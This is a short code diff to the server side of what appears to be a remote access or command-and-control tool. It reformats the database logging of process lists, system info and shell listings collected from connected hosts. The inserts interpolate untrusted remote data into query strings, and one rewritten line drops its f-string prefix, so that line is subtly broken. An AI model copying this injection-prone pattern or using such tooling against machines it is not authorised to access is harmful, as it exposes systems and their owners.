@@ -1,5 +1,5 @@
 from ServerDatabase.database import DatabaseClass
-from Modules.global_objects import (
+from .global_objects import (
     send_data,
     receive_data,
     remove_connection_list,
@@ -81,8 +81,9 @@ class SessionCommandsClass:
             "list_processes")
         processes = receive_data(conn)
         self.database.insert_entry(
-            "Processes", f'"{r_address[0]}","{processes}"',
-            f'{datetime.now().strftime("%Y-%m-%d %H:%M:%S")}"')
+            "Processes",
+            f'"{r_address[0]}","{processes}",' +
+            f'"{datetime.now().strftime("%Y-%m-%d %H:%M:%S")}"')
         print(processes)
         return
 
@@ -95,7 +96,7 @@ class SessionCommandsClass:
         data = receive_data(conn)  # recives data
         print(data)  # prints the results
         self.database.insert_entry(
-            "SystemInfo", f'"{r_address[0]}","{data}"',
+            "SystemInfo", f'"{r_address[0]}","{data}",' +
             f'"{datetime.now().strftime("%Y-%m-%d %H:%M:%S")}"')
         return
 
@@ -266,8 +267,9 @@ class SessionCommandsClass:
         else:
             try:
                 self.database.insert_entry(
-                    "Shell", f'"{r_address[0]}","{datetime.now().strftime(
-                        "%Y-%m-%d %H:%M:%S")}", "ls {dir}", "{directory}"')
+                    "Shell", f'"{r_address[0]}' +
+                    f'","{datetime.now().strftime("%Y-%m-%d %H:%M:%S")}",' +
+                    ' "ls {dir}", "{directory}"')
             except BaseException:
                 pass
         print(directory)
